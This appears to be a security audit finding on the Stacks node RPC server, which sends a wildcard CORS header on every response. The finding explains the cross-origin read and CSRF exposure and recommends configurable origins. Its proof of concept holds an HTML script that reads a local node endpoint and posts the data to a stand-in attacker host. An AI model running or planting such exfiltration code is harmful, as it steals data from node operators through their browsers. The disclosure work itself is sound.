### Title
Node RPC server unconditionally emits a wildcard CORS header on every response, exposing all node RPC endpoints to cross-origin reads and confused-deputy CSRF - (File: stackslib/src/net/http/response.rs)

### Summary
Every HTTP response produced by the Stacks node's RPC server hard-codes `Access-Control-Allow-Origin: *` (plus permissive `Access-Control-Allow-Headers`/`-Methods`) regardless of endpoint sensitivity, with no configuration knob to restrict the allowed origin. This is the same bug class as GHSA-38r9-3j52-h92v (aim tracking server): overly permissive CORS on the tracking/RPC server lets any third-party origin drive cross-origin requests against the server and, combined with unauthenticated write endpoints, mount CSRF-style attacks via a victim's browser, and read back sensitive response bodies that should be same-origin-only.

### Finding Description
`HttpResponsePreamble::consensus_serialize` unconditionally writes the wildcard CORS headers into every response unless the caller has already inserted the header itself: [1](#0-0) 

and the equivalent helper `add_CORS_headers` also unconditionally sets the origin to `*`: [2](#0-1) 

This applies identically to every RPC path the node serves — read endpoints such as `/v2/neighbors`, `/v2/accounts/:addr`, `/v2/pox`, mempool queries, etc., as well as write endpoints. Because there is no per-endpoint override and no configuration surface for the allowed origin (confirmed: no `cors` config option anywhere else in `stackslib`), a browser page hosted on any attacker-controlled origin can:
- Issue "simple" cross-origin `GET`/`POST` requests (no preflight required) to the node's RPC port that the victim's browser can reach (localhost dev nodes, LAN-bound nodes, or nodes reachable via DNS-rebinding from the browser), and
- Because the response carries `Access-Control-Allow-Origin: *`, have that response body (JSON/bytes) read directly by the attacker's JavaScript — turning the victim's browser into a network proxy that both triggers requests against internal/private RPC endpoints and exfiltrates their responses to the external attacker page.

For unauthenticated state-mutating endpoints, this is a straightforward CSRF/confused-deputy amplifier: the request itself is not blocked by CORS (CORS restricts response-reading, not request-sending), so any exposed but access-controlled-by-network-topology endpoint (e.g. gated only by "this port shouldn't be internet reachable") becomes reachable and readable through a victim who merely visits a malicious page while their browser has a route to the node.

Note: endpoints that gate on an explicit `Authorization` header (e.g. `RPCBlockProposalRequestHandler`, `RPCNakamotoBlockReplayRequestHandler`, `RPCFastCallReadOnlyRequestHandler`) are not directly exploitable this way because `Access-Control-Allow-Headers` does not include `authorization`, so a cross-origin preflight to attach that header would be rejected by the browser: [3](#0-2) 

However, this protects only the small set of `auth_token`-gated `/v3/*` endpoints; the bulk of the public `/v2/*` and unauthenticated `/v3/*` API surface has no such protection and is fully exposed to the wildcard-CORS cross-origin read/write pattern described above.

### Impact Explanation
This matches the "High - ... unauthorized write to state" / disclosure-adjacent tier: a malicious webpage can use a victim's browser as a pivot to reach and read from RPC endpoints on nodes that are only "protected" by network placement (localhost/LAN binding), disclosing chain/mempool/account data cross-origin, and can drive unauthenticated write endpoints via CSRF-style requests without any origin restriction ever blocking them.

### Likelihood Explanation
High likelihood for any node operator who runs the RPC interface reachable from a browser context (local development, wallet-adjacent tooling, LAN-exposed nodes) since the wildcard header is emitted unconditionally on every single response with no way to disable it; exploitation only requires getting a victim to load a malicious page while their browser has network access to the node.

### Recommendation
Do not hardcode `Access-Control-Allow-Origin: *` for all responses. Make the allowed origin configurable (default to no CORS header, or to a strict allow-list), and audit which RPC endpoints truly need to be reachable cross-origin from third-party web apps versus same-origin tooling only.

### Proof of Concept
1. Run a stacks-node with the RPC server bound to an address reachable from a browser (e.g. default local dev setup on `127.0.0.1:20443`).
2. Host a page on any external origin containing:
```html
<script>
fetch('http://127.0.0.1:20443/v2/neighbors')
  .then(r => r.json())
  .then(data => fetch('https://attacker.example/collect', {method:'POST', body: JSON.stringify(data)}));
</script>
```
3. Because every response includes `Access-Control-Allow-Origin: *` (per `stackslib/src/net/http/response.rs:397-410`), the browser permits the attacker's JavaScript to read the JSON body of `/v2/neighbors` (or any other RPC endpoint) even though the request originated from an unrelated origin, exfiltrating internal node/network data through the victim's browser.
